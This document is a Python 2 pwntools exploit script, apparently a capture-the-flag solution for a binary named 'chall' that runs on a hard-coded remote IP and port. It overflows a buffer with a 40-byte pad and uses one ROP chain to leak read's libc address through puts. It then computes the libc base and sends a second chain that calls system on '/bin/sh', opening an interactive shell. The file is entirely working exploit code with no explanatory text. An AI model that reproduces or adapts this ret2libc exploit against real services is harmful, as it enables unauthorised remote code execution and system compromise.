#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or '68.183.11.227'
port = int(args.PORT or 1887)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00000000004009f3
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
pop_rdi = 0x00000000004009f3
padding = "A"*40
io.recvuntil("4.exit \n\n")
io.sendline("1")
io.recv()
io.sendline("/bin/sh\x00")
io.recv()
io.send("/bin/sh\x00")
print(io.recvline())
print(io.recvline())
pause()
io.recvuntil("4.exit \n\n")

io.sendline("3")
io.recv()
rop1 = flat(
    padding,
    pop_rdi,
    exe.got['read'],
    exe.sym['puts'],
    exe.sym['main']
)

io.sendline(rop1)
io.recvline()
leak = u64(io.recvline().strip("\n").ljust(8, "\x00"))
pause()
libc = ELF("libc.so.6")
libc.address = leak - libc.sym['read']
bin_sh = 0x602090
log.info("libc leak : %s" % hex(leak))
log.info("libc base : %s" % hex(libc.address))

io.recvuntil("4.exit \n\n")
io.sendline("3")
io.recv()
rop2 = flat(
    padding,
    0x000000000040060e,
    pop_rdi,
    bin_sh,
    libc.sym['system']
)
io.sendline(rop2)
io.interactive()

